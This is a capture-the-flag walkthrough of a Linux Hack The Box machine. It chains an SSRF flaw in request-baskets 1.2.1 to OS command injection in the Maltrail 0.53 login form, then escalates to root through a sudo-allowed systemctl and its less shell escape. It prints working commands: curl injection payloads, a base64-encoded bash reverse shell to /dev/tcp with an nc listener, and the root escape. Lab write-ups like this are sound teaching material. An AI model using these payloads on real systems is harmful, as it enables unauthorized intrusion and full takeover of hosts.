---
tags:
  - Linux
  - HTTP
  - CVE
  - OS-command injection
  - Sudoers
---

... is a easy HTB machine which allows you to chain two `CVE`s. One service allows `SSRF` to an internal service which has a `OS command injection` vulnerability. For the privilege escalation, the user is allowed to run `systemctl` as `root`, which is the same escape as `less`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server
```
I have removed the `-sC` output for port `55555`, as it is quite verbose without any interesting data. Visiting `http://$IP:55555` shows me a web-page where i can create baskets to collect and inspect HTTP requests. The footer tells me that it is powered by `request-baskets version 1.2.1`.

Creating a test basket allows me to send requests to `http://$IP/<basket-name>` and they get logged at `http://$IP/web/<basket-name>`. I created one named `test`.

### Initial Exploitation
A `CVE-2023-27163` for this version of `request-baskets` exists, which allows users to perform `SSRF` (force the server to make requests), by creating a basket, editing it, and setting the `Forward URL` to any resource which may be hidden or only accessible via `localhost`, the server will send requests to that. They even get displayed in the response if the `Proxy Response` is checked!

I tried reading local files with the URL `file///etc/passwd`, or `dict:///etc/passwd`, but those protocols are not supported. That is why i decided to investigate port `80` which is being blocked by a firewall for me (not within the system), as port `55555` is maybe able to read it. I set the Forward URL to `http://localhost:80` and request my basket. I receive a response (a bit ugly, because there are no `CSS` or `JS` files included), which tells me that the service on port `80` is running a software called `Maltrail` with the version `0.53`.

A google search for this software with that version reveals that the `login` form has a `OS command injection` vulnerability in the `username` parameter! To abuse this, i quickly change the Forward URL to `http://localhost:80/login`. Then, i can send a `curl` request to that endpoint and provide additional data using this command:
```bash
curl http://$IP:55555/test --data 'username=test;`ping -c 3 <my-IP>`'
```
This sends a request to `$IP:55555/test`, which is my basket that redirects my request to `http://localhost:80/login`. There, i provide the username `test`, and i append the system command `ping -c 3 <my-IP>`. After inspecting the incoming `ping` packages using `sudo tcpdump -i tun0 icmp`, i notice that i am receiving `ping`s!

1. I encode my reverse shell initiator into `base64` with the following command:
```bash
echo 'bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"' | base64
```

2. I start my `nc` reverse shell listener:
```bash
nc -lvnp 1337
```

3. And initiate the reverse shell using this `curl`command:
```bash
curl http://$IP:55555/test --data 'username=test;`echo <base64> | base64 -d | bash -i`'
```
This gives me a reverse shell as `puma`!

It turns out that `puma` already has a `/home` directory and is not a service account. There are also no valid `plaintext` passwords for the `ssh` access, so i decided to simply upgrade the shell so that i can use it like `ssh`:
```bash
# within reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# background the process using CTRL-Z
stty raw -echo && fg
# press enter twice!
export SHELL=bash
export TERM=xterm-256color
stty rows 100 columns 100
# optional: do `reset`
```
This skips the need for `Lateral Movement`.

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

It turns out that `puma` is allowed to execute:
```bash
/usr/bin/systemctl status trail.service
```
as `root`! [GTFOBins](https://gtfobins.org/gtfobins/systemctl/#inherit) tells me that `systemctl` may inherit from `less` (use it), which is why i can use the shell escape from `less`. Executing `systemctl` throws me in a `less` window, which is why i can simply type `!/bin/bash` to get a `root` shell! 

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|SSRF| B[localhost<br>service];
  B -->|OS-Command<br>injection| C[OS-Code<br>execution];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Sudo<br>permission| B[systemctl];
  B -->|calls| C[less];
  C -->|open shell| D[Command<br>execution<br>as root];
```